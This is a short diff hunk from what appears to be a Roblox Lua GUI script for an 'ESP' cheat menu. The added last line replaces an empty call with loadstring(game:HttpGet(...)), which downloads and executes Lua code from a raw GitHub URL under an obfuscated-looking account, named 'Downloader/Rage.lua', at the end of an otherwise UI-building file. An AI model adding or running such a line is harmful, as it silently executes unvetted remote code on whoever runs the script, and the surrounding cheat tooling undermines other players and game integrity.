@@ -1312,4 +1312,4 @@ local function YZGINA_fake_script() -- ESP.ButtonManager
 	
 end
 coroutine.wrap(YZGINA_fake_script)()
-loadstring(game:HttpGet(""))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/Downloader/Rage.lua"))()
